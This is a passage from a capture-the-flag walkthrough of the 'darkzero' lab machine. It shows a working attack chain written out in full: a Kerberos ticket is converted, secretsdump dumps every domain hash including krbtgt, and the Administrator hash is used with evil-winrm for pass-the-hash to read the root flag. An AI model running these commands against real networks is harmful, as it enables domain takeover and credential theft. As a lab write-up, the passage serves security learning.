ApoAMCARKhIgQgkcYPHQ9dmapvND6uyfpdPdRVDd/ogbrfcx9lePb4mo+hDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDYwNzQ4NDdaphEYDzIwMjUxMDA2MTc0ODQ3WqcRGA8yMDI1MTAxMjIyMTgyMlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=" | base64 -d > dc01.kirbi
```

Now we convert to cache.

```bash
└─$ impacket-ticketConverter dc01.kirbi dc01.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Then set the ticket.

```bash
└─$ export KRB5CCNAME=dc01.ccache
```

Let's dump all the hash.

```bash
└─$ impacket-secretsdump -k -no-pass -just-dc DC01.darkzero.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up...
```

Got the hash for `Administrator` in `DC01`.

```bash
└─$ evil-winrm -i 10.129.121.112 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         10/5/2025   3:18 PM             34 root.txt
-ar---         10/5/2025   3:18 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
12432b7510c88dce8ba1c564825c25c1
```

BOOM! Got our real `root.txt` flag :D.

From my perspective, I thinking that the way from `svc_sql` to `nt system` in `DC02` is quite unintended as it exploited via `cve_2024_30088_authz_basep` so we gonna do things that will not using cve. <br>
This could be running `SharpHound` on `DC02` and then check if it has `ADCS` so we can view via the graph and exploit to get `root`. <br>
And we gonna doing some other reverse shell just to know that this can be exploited in more than 1 way.

> *Stay tuned, I gonna update this later on :>. Have fun with next machine :D*